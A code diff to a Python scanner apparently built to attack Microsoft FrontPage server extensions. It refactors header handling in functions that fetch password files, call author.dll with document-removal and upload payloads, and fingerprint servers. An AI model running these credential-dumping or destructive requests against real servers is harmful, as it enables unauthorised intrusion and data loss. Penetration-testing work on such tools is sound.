@@ -133,10 +133,20 @@ def target_information(name):
     print(f"{GREEN} [*] TARGET INFORMATION {RESET}")
     print("")
     try:
-        global custom_headers
         global s
 
-        headers = s.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
+        local_headers = {
+            'MIME-Version': '4.0',
+            'User-Agent': 'MSFrontPage/4.0',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+            'Connection': 'Keep-Alive'
+        }
+        # Update with user provided headers
+        session_headers = s.headers.copy()
+        session_headers.update(local_headers) 
+
+        headers = s.get(name, verify=False, headers=local_headers,proxies=custom_proxy)
         print("[+] Fetching information from the given target --> [%s]" % (headers.url))
         print("[+] Target responded with HTTP code --> [%s]" % headers.status_code)
         print("[+] Target is running server --> [%s]" % headers.headers['server'])
@@ -155,13 +165,12 @@ def build_target(target, front_dirs=[], refine_target=[]):
 
 
 def audit(target=[]):
-    global custom_headers
     global s
 
     print("")
     for element in target:
         try:
-            handle = s.get(element, verify=False, headers=custom_headers, proxies=custom_proxy)
+            handle = s.get(element, verify=False, proxies=custom_proxy)
             response_code = handle.status_code
             print("[+] (%s) - (%d)" % (element, response_code))
 
@@ -179,7 +188,6 @@ def audit(target=[]):
 
 def dump_credentials(dest):
     print("")
-    global custom_headers
     global custom_proxy
     global s
 
@@ -191,7 +199,7 @@ def dump_credentials(dest):
 
     for entry in pwd_targets:
         try:
-            handle = s.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
+            handle = s.get(entry, verify=False, proxies=custom_proxy)
             if handle.status_code == 200:
                 print("[+] Dumping contents of file located at : (%s)" % (entry))
                 filename = "__dump__.txt"
@@ -219,7 +227,6 @@ def dump_credentials(dest):
 
 def fingerprint_frontpage(name):
     print("")
-    global custom_headers
     global custom_proxy
     global s
 
@@ -234,7 +241,7 @@ def fingerprint_frontpage(name):
 
     for entry in build_enum_nix:
         try:
-            info = s.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
+            info = s.get(entry, verify=False, proxies=custom_proxy)
             if info.status_code == 200:
                 print("[+] Front page is tested as : nix version |  (%s) | (%d)" % (entry, info.status_code))
                 print("")
@@ -247,7 +254,7 @@ def fingerprint_frontpage(name):
 
     for entry in build_enum_win:
         try:
-            info = s.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
+            info = s.get(entry, verify=False, proxies=custom_proxy)
             if info.status_code == 200:
                 print("[+] Front page is tested as : windows version |  (%s) | (%d)" % (entry, info.status_code))
                 print("")
@@ -257,7 +264,7 @@ def fingerprint_frontpage(name):
 
     frontend_version = name + "/_vti_inf.html"
     try:
-        version = s.get(frontend_version, verify=False, headers=custom_headers, proxies=custom_proxy)
+        version = s.get(frontend_version, verify=False, proxies=custom_proxy)
         version_content = version.content.decode('utf-8')
         print("[+] Extracting frontpage version from default file : (%s):" % re.findall(r'FPVersion=(.*)',
                                                                                         version_content))
@@ -325,7 +332,8 @@ def frontpage_rpc_check(name):
         'Connection': 'Keep-Alive'
     }
     # Update with user provided headers
-    local_headers.update(custom_headers)
+    session_headers = s.headers.copy()
+    session_headers.update(local_headers)   
 
     exp_target_list = ['_vti_bin/shtml.exe/_vti_rpc', '_vti_bin/shtml.dll/_vti_rpc']
     data = ["method=server version"]
@@ -391,7 +399,8 @@ def frontpage_service_listing(name):
     }
 
     # Update with user provided headers
-    local_headers.update(custom_headers)
+    session_headers = s.headers.copy()
+    session_headers.update(local_headers)   
 
     i = 0
     service_target_list = ['_vti_bin/shtml.exe/_vti_rpc', '_vti_bin/shtml.dll/_vti_rpc']
@@ -447,7 +456,8 @@ def frontpage_config_check(name):
     }
 
     # Update with user provided headers
-    local_headers.update(custom_headers)
+    session_headers = s.headers.copy()
+    session_headers.update(local_headers)   
 
     front_exp_target = '_vti_bin/_vti_aut/author.dll'
     payloads = ['method=open service:3.0.2.1706&service_name=/',
@@ -511,7 +521,8 @@ def frontpage_remove_folder(name):
     }
 
     # Update with user provided headers
-    local_headers.update(custom_headers)
+    session_headers = s.headers.copy()
+    session_headers.update(local_headers)   
 
     file_exp_target = '_vti_bin/_vti_aut/author.dll'
     payloads = ['method=remove+documents:3.0.2.1786&service_name=/',
@@ -563,7 +574,8 @@ def file_upload_check(name):
     }
 
     # Update with user provided headers
-    local_headers.update(custom_headers)
+    session_headers = s.headers.copy()
+    session_headers.update(local_headers)   
 
     file_exp_target = '_vti_bin/_vti_aut/author.dll'
     payloads = [
@@ -625,11 +637,12 @@ def main():
                 except ValueError:
                     print(f"Error: Incorrect header format '{header}'. Expected format 'key=value'.")
                     sys.exit(1)
+            s.headers = custom_headers
 
         custom_proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
 
         if args.ntlm_login is not None and args.ntlm_password is not None:
-            s.auth = HttpNtlmAuth(args.ntlm_login, args.ntlm_passwordq)
+            s.auth = HttpNtlmAuth(args.ntlm_login, args.ntlm_password)
 
         target = args.url
         target_information(target)
